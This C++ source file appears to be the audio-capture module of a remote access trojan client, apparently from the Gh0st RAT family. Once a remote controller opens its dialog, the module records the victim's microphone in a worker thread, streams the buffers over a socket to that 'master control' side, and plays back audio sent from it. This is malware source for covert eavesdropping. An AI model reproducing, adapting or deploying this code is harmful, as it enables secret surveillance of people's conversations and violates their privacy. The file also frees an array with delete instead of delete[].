// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "AudioManager.h"
#include "ClientSocket.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CAudioManager::m_bIsWorking = false;
CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{		
	if (!Initialize())        //初始化
	{
		return;
	}
	
	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	
	WaitForDialogOpen();    //等待对话框打开
	                        //创建工作线程
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread,
		(LPVOID)this, 0, NULL);
}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = false;                            //设定工作状态为假
	WaitForSingleObject(m_hWorkThread, INFINITE);    //等待 工作线程结束
	
	delete	m_lpAudio;    //释放分配的对象内存

}


bool CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())   //获取波形输入设备的数目  实际就是看看有没有声卡
		return false;
	
	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
		return false;
	
	m_lpAudio = new CAudio;
	
	m_bIsWorking = true;
	return true;
	//返回构造函数
}

DWORD WINAPI CAudioManager::WorkThread(LPVOID lparam)
{

	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bIsWorking)
		pThis->SendRecordBuffer();     //一个循环 反复发送数据
	
	return -1;
}


int CAudioManager::SendRecordBuffer()
{
  
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	//这里得到 音频数据
	LPBYTE	lpBuffer = m_lpAudio->GetRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;
	//分配缓冲区
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	//加入数据头
	lpPacket[0] = TOKEN_AUDIO_DATA;     //向主控端发送该消息
	//复制缓冲区
	memcpy(lpPacket + 1, lpBuffer, dwBytes);
    //发送出去
	if (dwBytes > 0)
		nSendBytes = Send(lpPacket, dwBytes + 1);
	delete	lpPacket;
    
	return nSendBytes;
	
}


void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)    
	{
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->PlayBuffer(lpBuffer, nSize);       
}